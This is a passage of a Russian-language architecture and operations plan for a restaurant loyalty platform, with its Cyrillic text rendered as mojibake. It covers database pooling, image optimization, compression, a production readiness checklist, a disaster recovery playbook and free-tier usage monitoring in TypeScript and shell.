    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º connection pool limits —á–µ—Ä–µ–∑ DATABASE_URL
    // postgresql://user:pass@host:5432/db?connection_limit=10&pool_timeout=20

    await this.$connect();
    console.log('‚úÖ Prisma connected to database');
  }

  async onModuleDestroy() {
    await this.$disconnect();
  }
}
```

**DATABASE_URL —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏:**

```bash
# Fly.io secrets
fly secrets set DATABASE_URL="postgresql://user:pass@neon.tech:5432/max_loyalty_prod?connection_limit=10&pool_timeout=20&connect_timeout=10"

# –ü–∞—Ä–∞–º–µ—Ç—Ä—ã:
# connection_limit=10   - –ú–∞–∫—Å–∏–º—É–º 10 —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π –æ—Ç —ç—Ç–æ–≥–æ –∏–Ω—Å—Ç–∞–Ω—Å–∞
# pool_timeout=20       - –ñ–¥—ë–º 20 —Å–µ–∫—É–Ω–¥ —Å–≤–æ–±–æ–¥–Ω–æ–≥–æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
# connect_timeout=10    - –¢–∞–π–º–∞—É—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ë–î 10 —Å–µ–∫—É–Ω–¥
```

**Neon.tech connection pooling (Pgbouncer):**

```bash
# Neon –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç 2 URL:
# 1. Pooled connection (—á–µ—Ä–µ–∑ Pgbouncer)
DATABASE_URL="postgresql://user:pass@pooler.neon.tech:5432/db"

# 2. Direct connection (–¥–ª—è –º–∏–≥—Ä–∞—Ü–∏–π)
DIRECT_DATABASE_URL="postgresql://user:pass@neon.tech:5432/db"
```

**prisma/schema.prisma:**

```prisma
datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")           // Pooled –¥–ª—è runtime
  directUrl = env("DIRECT_DATABASE_URL")   // Direct –¥–ª—è –º–∏–≥—Ä–∞—Ü–∏–π
}
```


***

### **2Ô∏è‚É£9Ô∏è‚É£ Image optimization: –ö–∞–∫ –æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞—Ç—å –∑–∞–≥—Ä—É–∑–∫—É –ª–æ–≥–æ—Ç–∏–ø–æ–≤/–∞–≤–∞—Ç–∞—Ä–æ–≤?**

**–í–û–ü–†–û–°:** –õ–æ–≥–æ—Ç–∏–ø—ã —Ä–µ—Å—Ç–æ—Ä–∞–Ω–æ–≤ –∏ –∞–≤–∞—Ç–∞—Ä—ã –≥–æ—Å—Ç–µ–π - –∫–∞–∫ –æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞—Ç—å?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï (Cloudflare R2 + Images CDN):**

```typescript
// apps/backend/src/storage/image.service.ts
import { Injectable } from '@nestjs/common';
import { S3Service } from './s3.service';
import sharp from 'sharp';
import { v4 as uuidv4 } from 'uuid';

@Injectable()
export class ImageService {
  constructor(private s3: S3Service) {}

  async uploadAndOptimize(
    file: Express.Multer.File,
    folder: 'logos' | 'avatars' | 'cards',
  ): Promise<string> {
    const fileId = uuidv4();
    const formats = ['webp', 'png']; // WebP –¥–ª—è modern browsers, PNG fallback

    // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ä–∞–∑–º–µ—Ä—ã –ø–æ —Ç–∏–ø—É
    const sizes = this.getSizes(folder);

    const uploadPromises = [];

    for (const size of sizes) {
      for (const format of formats) {
        const optimized = await sharp(file.buffer)
          .resize(size.width, size.height, {
            fit: 'cover',
            position: 'center',
          })
          .toFormat(format as any, {
            quality: format === 'webp' ? 85 : 90,
          })
          .toBuffer();

        const key = `${folder}/${fileId}-${size.suffix}.${format}`;
        
        uploadPromises.push(
          this.s3.uploadBuffer(optimized, key, {
            contentType: `image/${format}`,
            cacheControl: 'public, max-age=31536000, immutable',
          }),
        );
      }
    }

    await Promise.all(uploadPromises);

    // –í–æ–∑–≤—Ä–∞—â–∞–µ–º URL –±–µ–∑ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è (CDN —Å–∞–º –ø–æ–¥–±–µ—Ä—ë—Ç —Ñ–æ—Ä–º–∞—Ç)
    return `https://cdn.max-loyalty.com/${folder}/${fileId}`;
  }

  private getSizes(folder: string) {
    switch (folder) {
      case 'logos':
        return [
          { width: 200, height: 200, suffix: 'thumb' },
          { width: 500, height: 500, suffix: 'medium' },
          { width: 1000, height: 1000, suffix: 'large' },
        ];
      case 'avatars':
        return [
          { width: 50, height: 50, suffix: 'xs' },
          { width: 100, height: 100, suffix: 'sm' },
          { width: 200, height: 200, suffix: 'md' },
        ];
      case 'cards':
        return [
          { width: 400, height: 250, suffix: 'mobile' },
          { width: 800, height: 500, suffix: 'desktop' },
        ];
    }
  }
}
```

**Cloudflare Workers –¥–ª—è on-the-fly resizing:**

```typescript
// cloudflare-workers/image-resize.ts
export default {
  async fetch(request: Request): Promise<Response> {
    const url = new URL(request.url);
    const pathname = url.pathname;

    // Parse request: /logos/uuid-thumb.webp?w=300
    const match = pathname.match(/^\/(\w+)\/([\w-]+)-(thumb|medium|large)\.(webp|png)$/);
    
    if (!match) {
      return new Response('Invalid image URL', { status: 400 });
    }

    const [, folder, fileId, size, format] = match;
    const requestedWidth = url.searchParams.get('w');

    // Fetch from R2
    const r2Url = `https://r2.max-loyalty.com/${folder}/${fileId}-${size}.${format}`;
    let response = await fetch(r2Url);

    // On-the-fly resize –µ—Å–ª–∏ –Ω—É–∂–µ–Ω custom —Ä–∞–∑–º–µ—Ä
    if (requestedWidth && response.ok) {
      const imageBuffer = await response.arrayBuffer();
      
      // –ò—Å–ø–æ–ª—å–∑—É–µ–º Cloudflare Image Resizing (–ø–ª–∞—Ç–Ω–∞—è —Ñ–∏—á–∞)
      // –ò–ª–∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –∫–∞–∫ –µ—Å—Ç—å –Ω–∞ free tier
    }

    // Cache –Ω–∞ –≥–æ–¥
    return new Response(response.body, {
      headers: {
        'Content-Type': `image/${format}`,
        'Cache-Control': 'public, max-age=31536000, immutable',
        'CDN-Cache-Control': 'max-age=31536000',
      },
    });
  },
};
```

**Frontend usage:**

```tsx
// Responsive image —Å fallback
<picture>
  <source
    srcSet={`${logoUrl}-thumb.webp 200w, ${logoUrl}-medium.webp 500w`}
    type="image/webp"
  />
  <source
    srcSet={`${logoUrl}-thumb.png 200w, ${logoUrl}-medium.png 500w`}
    type="image/png"
  />
  <img src={`${logoUrl}-medium.png`} alt="Restaurant logo" />
</picture>
```


***

### **3Ô∏è‚É£0Ô∏è‚É£ API Response compression: Gzip –∏–ª–∏ Brotli?**

**–í–û–ü–†–û–°:** –°–∂–∏–º–∞—Ç—å –ª–∏ API responses –∏ –∫–∞–∫–∏–º –∞–ª–≥–æ—Ä–∏—Ç–º–æ–º?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Brotli (–µ—Å–ª–∏ –±—Ä–∞—É–∑–µ—Ä –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç) + Gzip fallback**

```typescript
// apps/backend/src/main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import * as compression from 'compression';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Compression middleware
  app.use(
    compression({
      filter: (req, res) => {
        // –ù–µ —Å–∂–∏–º–∞–µ–º –µ—Å–ª–∏ —É–∂–µ —Å–∂–∞—Ç–æ –∏–ª–∏ –µ—Å–ª–∏ —ç—Ç–æ stream
        if (req.headers['x-no-compression']) {
          return false;
        }
        return compression.filter(req, res);
      },
      threshold: 1024, // –°–∂–∏–º–∞–µ–º —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ > 1 KB
      level: 6, // –ö–æ–º–ø—Ä–æ–º–∏—Å—Å –º–µ–∂–¥—É —Å–∫–æ—Ä–æ—Å—Ç—å—é –∏ —Å—Ç–µ–ø–µ–Ω—å—é —Å–∂–∞—Ç–∏—è (1-9)
    }),
  );

  await app.listen(3000);
}
bootstrap();
```

**Cloudflare –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏–º–µ–Ω—è–µ—Ç Brotli:**

- ‚úÖ –î–ª—è —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏—Ö —Ñ–∞–π–ª–æ–≤ (JS, CSS, HTML)
- ‚úÖ –î–ª—è API responses (–µ—Å–ª–∏ `Accept-Encoding: br`)
- ‚úÖ Brotli –¥–∞—ë—Ç ~20% –ª—É—á—à–µ —Å–∂–∞—Ç–∏–µ —á–µ–º Gzip

**–ß—Ç–æ —Å–∂–∏–º–∞–µ—Ç—Å—è:**

```
JSON response 50 KB ‚Üí 5-10 KB (Brotli)
HTML page 100 KB ‚Üí 15-20 KB (Brotli)
JS bundle 500 KB ‚Üí 120-150 KB (Brotli)
```

**–ù–µ —Å–∂–∏–º–∞–µ–º:**

- ‚ùå –ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è (—É–∂–µ —Å–∂–∞—Ç—ã)
- ‚ùå –í–∏–¥–µ–æ
- ‚ùå –£–∂–µ —Å–∂–∞—Ç—ã–µ —Ñ–∞–π–ª—ã (.zip, .gz)

***

## üéØ **–ë–õ–û–ö 6: PRODUCTION READINESS (5 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **3Ô∏è‚É£1Ô∏è‚É£ Production checklist: –ß—Ç–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º?**

**–ú–û–ô –ü–û–õ–ù–´–ô CHECKLIST:**

```markdown
# üöÄ PRODUCTION READINESS CHECKLIST

## üîí SECURITY
- [ ] –í—Å–µ secrets –≤ Fly.io secrets (–Ω–µ –≤ git)
- [ ] JWT_SECRET –º–∏–Ω–∏–º—É–º 32 —Å–∏–º–≤–æ–ª–∞ (random)
- [ ] ENCRYPTION_KEY –¥–ª—è –ë–î —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
- [ ] Rate limiting –≤–∫–ª—é—á–µ–Ω (Cloudflare + Backend)
- [ ] CORS –Ω–∞—Å—Ç—Ä–æ–µ–Ω —Ç–æ–ª—å–∫–æ –¥–ª—è —Å–≤–æ–∏—Ö –¥–æ–º–µ–Ω–æ–≤
- [ ] HTTPS –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω (force redirect)
- [ ] Security headers (helmet.js)
- [ ] SQL injection –∑–∞—â–∏—Ç–∞ (Prisma ORM)
- [ ] XSS –∑–∞—â–∏—Ç–∞ (input sanitization)
- [ ] CSRF tokens –¥–ª—è —Ñ–æ—Ä–º
- [ ] Content Security Policy (CSP)
- [ ] API keys encrypted –≤ –ë–î
- [ ] No sensitive data –≤ –ª–æ–≥–∞—Ö

## üóÑÔ∏è DATABASE
- [ ] –í—Å–µ migrations –ø—Ä–∏–º–µ–Ω–µ–Ω—ã
- [ ] Indexes —Å–æ–∑–¥–∞–Ω—ã (—Å–º. –≤–æ–ø—Ä–æ—Å 26)
- [ ] Connection pooling –Ω–∞—Å—Ç—Ä–æ–µ–Ω
- [ ] Backups –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ (Neon.tech + S3)
- [ ] Slow query monitoring –≤–∫–ª—é—á–µ–Ω
- [ ] pg_stat_statements extension –≤–∫–ª—é—á—ë–Ω
- [ ] Database size monitoring
- [ ] Connection limit < 100

## üìä MONITORING & LOGGING
- [ ] Better Stack –ø–æ–¥–∫–ª—é—á—ë–Ω
- [ ] Uptime monitors –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã
- [ ] Alert rules –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã (Telegram)
- [ ] Error tracking —Ä–∞–±–æ—Ç–∞–µ—Ç
- [ ] Structured JSON logs
- [ ] No PII –≤ –ª–æ–≥–∞—Ö
- [ ] Log retention 30 –¥–Ω–µ–π
- [ ] Business metrics tracking

## üîÑ CI/CD
- [ ] GitHub Actions workflow —Ä–∞–±–æ—Ç–∞–µ—Ç
- [ ] Tests –ø—Ä–æ—Ö–æ–¥—è—Ç (unit + integration)
- [ ] Linting –≤–∫–ª—é—á—ë–Ω
- [ ] Type checking –≤–∫–ª—é—á—ë–Ω
- [ ] Automated deploys –Ω–∞ main branch
- [ ] Rollback plan –≥–æ—Ç–æ–≤

## üåê INFRASTRUCTURE
- [ ] Fly.io VM –∑–∞–ø—É—â–µ–Ω—ã (3 VM: API, Worker, Cron)
- [ ] Health checks –ø—Ä–æ—Ö–æ–¥—è—Ç
- [ ] Graceful shutdown –Ω–∞—Å—Ç—Ä–æ–µ–Ω
- [ ] Zero-downtime deploys
- [ ] Custom domain –Ω–∞—Å—Ç—Ä–æ–µ–Ω
- [ ] SSL certificate —Ä–∞–±–æ—Ç–∞–µ—Ç
- [ ] CDN –Ω–∞—Å—Ç—Ä–æ–µ–Ω (Cloudflare)
- [ ] DNS records –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ

## üí∞ BILLING & LIMITS
- [ ] Subscription webhook handlers —Ä–∞–±–æ—Ç–∞—é—Ç
- [ ] Tenant limits –ø—Ä–æ–≤–µ—Ä—è—é—Ç—Å—è
- [ ] Restricted mode –¥–ª—è –Ω–µ–æ–ø–ª–∞—á–µ–Ω–Ω—ã—Ö
- [ ] Payment retry logic —Ä–∞–±–æ—Ç–∞–µ—Ç
- [ ] Invoice generation —Ä–∞–±–æ—Ç–∞–µ—Ç
- [ ] Refund logic –≥–æ—Ç–æ–≤

## üìß EXTERNAL SERVICES
- [ ] Email service —Ä–∞–±–æ—Ç–∞–µ—Ç (Resend)
- [ ] SMS provider –Ω–∞—Å—Ç—Ä–æ–µ–Ω (SMS.RU)
- [ ] S3 storage —Ä–∞–±–æ—Ç–∞–µ—Ç (Cloudflare R2)
- [ ] Redis –¥–æ—Å—Ç—É–ø–µ–Ω (Upstash)
- [ ] POS webhooks –≤–∞–ª–∏–¥–∏—Ä—É—é—Ç—Å—è (HMAC)
- [ ] Payment provider webhooks —Ä–∞–±–æ—Ç–∞—é—Ç

## üß™ TESTING
- [ ] Load testing –ø—Ä–æ–π–¥–µ–Ω (k6)
- [ ] API endpoints –≤—Å–µ –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω—ã
- [ ] Critical flows —Ä–∞–±–æ—Ç–∞—é—Ç (E2E)
- [ ] Error scenarios –æ–±—Ä–∞–±–æ—Ç–∞–Ω—ã
- [ ] Edge cases –ø–æ–∫—Ä—ã—Ç—ã

## üì± TELEGRAM BOT
- [ ] Bot –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω (@BotFather)
- [ ] Webhook –Ω–∞—Å—Ç—Ä–æ–µ–Ω
- [ ] Commands —Ä–∞–±–æ—Ç–∞—é—Ç
- [ ] Mini App –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç—Å—è
- [ ] Notifications –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è

## üìÑ DOCUMENTATION
- [ ] API documentation (Swagger)
- [ ] README.md –∞–∫—Ç—É–∞–ª–µ–Ω
- [ ] Environment variables –∑–∞–¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω—ã
- [ ] Runbook –¥–ª—è incidents
- [ ] Architecture diagram –≥–æ—Ç–æ–≤

## üîß OPERATIONAL
- [ ] On-call rotation setup
- [ ] Incident response plan
- [ ] Backup restore –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω
- [ ] Database migration rollback –ø–ª–∞–Ω
- [ ] Status page (–µ—Å–ª–∏ –Ω—É–∂–µ–Ω)
```

**Automated checks script:**

```typescript
// scripts/production-checklist.ts
import { PrismaClient } from '@prisma/client';
import Redis from 'ioredis';
import axios from 'axios';

async function runChecks() {
  console.log('üîç Running production readiness checks...\n');

  const results = {
    passed: 0,
    failed: 0,
    warnings: 0,
  };

  // Check 1: Database connection
  try {
    const prisma = new PrismaClient();
    await prisma.$connect();
    console.log('‚úÖ Database connection');
    results.passed++;
    await prisma.$disconnect();
  } catch (error) {
    console.error('‚ùå Database connection failed:', error.message);
    results.failed++;
  }

  // Check 2: Redis connection
  try {
    const redis = new Redis(process.env.REDIS_URL);
    await redis.ping();
    console.log('‚úÖ Redis connection');
    results.passed++;
    redis.disconnect();
  } catch (error) {
    console.error('‚ùå Redis connection failed:', error.message);
    results.failed++;
  }

  // Check 3: API health endpoint
  try {
    const response = await axios.get('https://api.max-loyalty.com/health');
    if (response.data.status === 'ok') {
      console.log('‚úÖ API health check');
      results.passed++;
    } else {
      throw new Error('Health check returned non-ok status');
    }
  } catch (error) {
    console.error('‚ùå API health check failed:', error.message);
    results.failed++;
  }

  // Check 4: Required environment variables
  const requiredEnvVars = [
    'DATABASE_URL',
    'REDIS_URL',
    'JWT_SECRET',
    'ENCRYPTION_KEY',
    'RESEND_API_KEY',
    'SMS_RU_API_KEY',
    'BETTER_STACK_TOKEN',
  ];

  for (const envVar of requiredEnvVars) {
    if (process.env[envVar]) {
      console.log(`‚úÖ ${envVar} set`);
      results.passed++;
    } else {
      console.error(`‚ùå ${envVar} not set`);
      results.failed++;
    }
  }

  // Check 5: JWT secret strength
  if (process.env.JWT_SECRET && process.env.JWT_SECRET.length < 32) {
    console.warn('‚ö†Ô∏è JWT_SECRET should be at least 32 characters');
    results.warnings++;
  } else {
    console.log('‚úÖ JWT_SECRET strength');
    results.passed++;
  }

  // Summary
  console.log(`\nüìä Summary:`);
  console.log(`   ‚úÖ Passed: ${results.passed}`);
  console.log(`   ‚ùå Failed: ${results.failed}`);
  console.log(`   ‚ö†Ô∏è Warnings: ${results.warnings}`);

  if (results.failed > 0) {
    console.error('\n‚ùå Production readiness check FAILED');
    process.exit(1);
  } else {
    console.log('\n‚úÖ Production readiness check PASSED');
    process.exit(0);
  }
}

runChecks();
```

**–í GitHub Actions:**

```yaml
- name: Production readiness check
  run: npm run check:production
  env:
    DATABASE_URL: ${{ secrets.DATABASE_URL }}
    REDIS_URL: ${{ secrets.REDIS_URL }}
    # ...
```


***

### **3Ô∏è‚É£2Ô∏è‚É£ Disaster recovery plan: –ß—Ç–æ –¥–µ–ª–∞—Ç—å –µ—Å–ª–∏ –≤—Å—ë —É–ø–∞–ª–æ?**

**–í–û–ü–†–û–°:** –°—Ü–µ–Ω–∞—Ä–∏–∏ –∞–≤–∞—Ä–∏–π –∏ –∫–∞–∫ –≤–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å?

**–ú–û–ô DISASTER RECOVERY PLAYBOOK:**

```markdown
# üÜò DISASTER RECOVERY PLAYBOOK

## üî¥ SCENARIO 1: Backend API Down

### Detection:
- Better Stack alert: "Backend API down for 2 minutes"
- HTTP 503 errors
- Telegram –∞–ª–µ—Ä—Ç

### Diagnosis:
1. Check Fly.io status page: https://status.fly.io/
2. Check VM status: `fly status -a max-loyalty-prod`
3. Check logs: `fly logs -a max-loyalty-prod`

### Recovery:
```bash
# Option A: Restart VMs
fly apps restart max-loyalty-prod

# Option B: Redeploy last working version
fly releases -a max-loyalty-prod
fly deploy --image-ref <previous-image>

# Option C: Rollback deployment
fly releases -a max-loyalty-prod
fly rollback -a max-loyalty-prod --version <previous-version>
```


### Verification:

```bash
curl https://api.max-loyalty.com/health
# Expected: {"status":"ok"}
```


### ETA: 5 minutes


---

## üü† SCENARIO 2: Database Connection Loss

### Detection:

- Prisma errors: "Can't reach database server"
- Health check failing on /health endpoint


### Diagnosis:

```bash
# Check Neon.tech status
curl https://neon.tech/api/v2/projects/<project-id>/status

# Test connection manually
psql $DATABASE_URL -c "SELECT 1"
```


### Recovery:

```bash
# Option A: Restart connection pool
fly apps restart max-loyalty-prod

# Option B: Switch to backup database (if exists)
fly secrets set DATABASE_URL="<backup-db-url>"
fly apps restart max-loyalty-prod

# Option C: Restore from backup
neon branches create --from main --timestamp "1 hour ago"
fly secrets set DATABASE_URL="<new-branch-url>"
```


### ETA: 10-15 minutes


---

## üü° SCENARIO 3: Redis Down (Upstash)

### Detection:

- Redis connection errors
- Rate limiting not working
- Sessions not persisting


### Impact: LOW (app —Ä–∞–±–æ—Ç–∞–µ—Ç, –Ω–æ degraded)

### Recovery:

```bash
# Redis –Ω–µ –∫—Ä–∏—Ç–∏—á–µ–Ω, app –ø—Ä–æ–¥–æ–ª–∂–∏—Ç —Ä–∞–±–æ—Ç–∞—Ç—å
# –ü—Ä–æ—Å—Ç–æ –º–æ–Ω–∏—Ç–æ—Ä–∏–º Upstash status: https://status.upstash.com/

# –ï—Å–ª–∏ –¥–æ–ª–≥–æ –Ω–µ –≤–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è, –ø–µ—Ä–µ–∫–ª—é—á–∞–µ–º—Å—è –Ω–∞ fallback
fly secrets set REDIS_URL="redis://alternative-provider"
fly apps restart max-loyalty-prod
```


### ETA: 5 minutes (–∏–ª–∏ –∂–¥—ë–º Upstash –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è)


---

## üî¥ SCENARIO 4: Data Loss / Accidental Delete

### Detection:

- –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–æ–æ–±—â–∞–µ—Ç: "–í—Å–µ –º–æ–∏ –≥–æ—Å—Ç–∏ –ø—Ä–æ–ø–∞–ª–∏!"
- Audit logs –ø–æ–∫–∞–∑—ã–≤–∞—é—Ç –º–∞—Å—Å–æ–≤–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ


### Recovery:

```bash
# 1. STOP –≤—Å–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ –∑–∞–ø–∏—Å–∏
fly scale count 0 -a max-loyalty-prod

# 2. –û–ø—Ä–µ–¥–µ–ª—è–µ–º –≤—Ä–µ–º—è –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞
# 3. –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏–∑ Neon.tech point-in-time backup
neon branches create \
  --from main \
  --timestamp "2026-02-12T14:00:00Z" \
  --name "recovery-feb12"

# 4. –ü–æ–¥–∫–ª—é—á–∞–µ–º recovered –ë–î
NEW_DB_URL=$(neon connection-string recovery-feb12)
fly secrets set DATABASE_URL="$NEW_DB_URL"

# 5. –†–µ—Å—Ç–∞—Ä—Ç—É–µ–º
fly scale count 3 -a max-loyalty-prod

# 6. –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–∞–Ω–Ω—ã–µ
psql $NEW_DB_URL -c "SELECT COUNT(*) FROM \"Guest\""
```


### ETA: 20-30 minutes


---

## üü† SCENARIO 5: S3 Storage Unavailable (Cloudflare R2)

### Detection:

- –û—à–∏–±–∫–∏ –∑–∞–≥—Ä—É–∑–∫–∏ –ª–æ–≥–æ—Ç–∏–ø–æ–≤
- "Failed to upload image" –≤ –ª–æ–≥–∞—Ö


### Impact: MEDIUM (app —Ä–∞–±–æ—Ç–∞–µ—Ç, –Ω–æ –Ω–µ–ª—å–∑—è –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª—ã)

### Recovery:

```bash
# Cloudflare R2 –æ—á–µ–Ω—å —Å—Ç–∞–±–∏–ª–µ–Ω, –Ω–æ –µ—Å–ª–∏ –ø—Ä–æ–±–ª–µ–º–∞:

# Option A: Switch to backup bucket
fly secrets set \
  S3_BUCKET="max-loyalty-backup" \
  S3_ENDPOINT="https://backup.r2.cloudflarestorage.com"

# Option B: Switch to alternative provider (Backblaze B2)
fly secrets set \
  S3_ENDPOINT="https://s3.us-west-002.backblazeb2.com" \
  S3_BUCKET="max-loyalty" \
  S3_ACCESS_KEY="..." \
  S3_SECRET_KEY="..."
```


### ETA: 10 minutes


---

## üî¥ SCENARIO 6: Complete Platform Outage (Fly.io Down)

### Detection:

- –í—Å–µ VM –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã
- Fly.io status page shows incident


### Recovery:

```bash
# –ë—ã—Å—Ç—Ä—ã–π –ø–µ—Ä–µ–Ω–æ—Å –Ω–∞ Render.com –∏–ª–∏ Railway

# 1. Deploy –Ω–∞ backup provider (–ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ –Ω–∞—Å—Ç—Ä–æ–µ–Ω)
git push render main  # –∏–ª–∏ railway up

# 2. Update DNS (Cloudflare)
# api.max-loyalty.com ‚Üí –Ω–æ–≤—ã–π –ø—Ä–æ–≤–∞–π–¥–µ—Ä

# 3. –£–≤–µ–¥–æ–º–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ Telegram
curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" \
  -d "chat_id=@max_loyalty_announcements" \
  -d "text=üö® –ü—Ä–æ–≤–æ–¥—è—Ç—Å—è —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ —Ä–∞–±–æ—Ç—ã. –°–µ—Ä–≤–∏—Å —Å–∫–æ—Ä–æ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è."
```


### ETA: 30-60 minutes


---

## üìû ESCALATION

### Level 1: Automated alerts ‚Üí Telegram

### Level 2: On-call engineer (you)

### Level 3: Vendor support (Fly.io, Neon.tech)

### Contacts:

- Fly.io support: support@fly.io
- Neon.tech support: support@neon.tech
- Cloudflare support: enterprise support (–ø–ª–∞—Ç–Ω—ã–π)

```

***

### **3Ô∏è‚É£3Ô∏è‚É£ Cost optimization: –ö–∞–∫ —É–ª–æ–∂–∏—Ç—å—Å—è –≤ –±–µ—Å–ø–ª–∞—Ç–Ω—ã–µ –ª–∏–º–∏—Ç—ã?**

**–í–û–ü–†–û–°:** –°–ª–µ–¥–∏—Ç—å –∑–∞ usage –∏ –Ω–µ –ø—Ä–µ–≤—ã—à–∞—Ç—å free tier –ª–∏–º–∏—Ç—ã?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï: Usage tracking dashboard**

```typescript
// apps/backend/src/monitoring/usage-tracking.service.ts
import { Injectable } from '@nestjs/common';
import { Cron, CronExpression } from '@nestjs/schedule';
import { PrismaService } from '@/database/prisma.service';
import { RedisService } from '@/redis/redis.service';
import { LoggerService } from '@/logging/logger.service';

interface UsageStats {
  // Fly.io
  fly: {
    vm_hours: number;
    bandwidth_gb: number;
    storage_gb: number;
  };
  
  // Neon.tech
  neon: {
    storage_gb: number;
    compute_hours: number;
  };
  
  // Upstash Redis
  upstash: {
    commands_today: number;
    storage_mb: number;
  };
  
  // Cloudflare R2
  r2: {
    storage_gb: number;
    requests_count: number;
  };
  
  // Vercel
  vercel: {
    bandwidth_gb: number;
    functions_executions: number;
  };
  
  // GitHub Actions
  github: {
    minutes_used: number;
  };
}

@Injectable()
export class UsageTrackingService {
  constructor(
    private prisma: PrismaService,
    private redis: RedisService,
    private logger: LoggerService,
  ) {}

  @Cron(CronExpression.EVERY_DAY_AT_MIDNIGHT)
  async trackDailyUsage() {
    const stats = await this.collectUsageStats();
    
    // Save to database
    await this.prisma.usageSnapshot.create({
      data: {
        date: new Date(),
        stats: stats as any,
      },
    });

    // Check limits
    await this.checkLimits(stats);
  }

  private async collectUsageStats(): Promise<UsageStats> {
    return {
      fly: await this.getFlyUsage(),
      neon: await this.getNeonUsage(),
      upstash: await this.getUpstashUsage(),
      r2: await this.getR2Usage(),
      vercel: await this.getVercelUsage(),
      github: await this.getGitHubUsage(),
    };
  }

  private async getFlyUsage() {
    // API call to Fly.io
    // GET https://api.fly.io/v1/apps/max-loyalty-prod/metrics
    return {
      vm_hours: 0, // Calculate from uptime
      bandwidth_gb: 0,
      storage_gb: 3,
    };
  }

  private async getUpstashUsage() {
    // –°—á–∏—Ç–∞–µ–º commands –∑–∞ —Å–µ–≥–æ–¥–Ω—è
    const key = `usage:redis:${new Date().toISOString().split('T')[0]}`;
    const commands = await this.redis.get(key);
    
    return {
      commands_today: parseInt(commands || '0'),
      storage_mb: 0, // –ò–∑ Upstash dashboard API
    };
  }

  private async checkLimits(stats: UsageStats) {
    const alerts = [];

    // Upstash Redis: 10,000 commands/–¥–µ–Ω—å
    if (stats.upstash.commands_today > 8000) {
      alerts.push({
        service: 'Upstash Redis',
        metric: 'Commands',
        current: stats.upstash.commands_today,
        limit: 10000,
        percentage: (stats.upstash.commands_today / 10000) * 100,
      });
    }

    // Neon.tech: 3 GB storage
    if (stats.neon.storage_gb > 2.5) {
      alerts.push({
        service: 'Neon.tech',
        metric: 'Storage',
        current: stats.neon.storage_gb,
        limit: 3,
        percentage: (stats.neon.storage_gb / 3) * 100,
      });
    }

    // Cloudflare R2: 10 GB storage
    if (stats.r2.storage_gb > 8) {
      alerts.push({
        service: 'Cloudflare R2',
        metric: 'Storage',
        current: stats.r2.storage_gb,
        limit: 10,
        percentage: (stats.r2.storage_gb / 10) * 100,
      });
    }

    // Vercel: 100 GB bandwidth
    if (stats.vercel.bandwidth_gb > 80) {
      alerts.push({
        service: 'Vercel',
        metric: 'Bandwidth',
        current: stats.vercel.bandwidth_gb,
        limit: 100,
        percentage: (stats.vercel.bandwidth_gb / 100) * 100,
      });
    }

    // GitHub Actions: 2000 minutes
    if (stats.github.minutes_used > 1600) {
      alerts.push({
        service: 'GitHub Actions',
        metric: 'Minutes',
        current: stats.github.minutes_used,
        limit: 2000,
        percentage: (stats.github.minutes_used / 2000) * 100,
      });
    }

    // Send alerts if > 80% usage
    if (alerts.length > 0) {
      await this.sendUsageAlerts(alerts);
    }
  }

  private async sendUsageAlerts(alerts: any[]) {
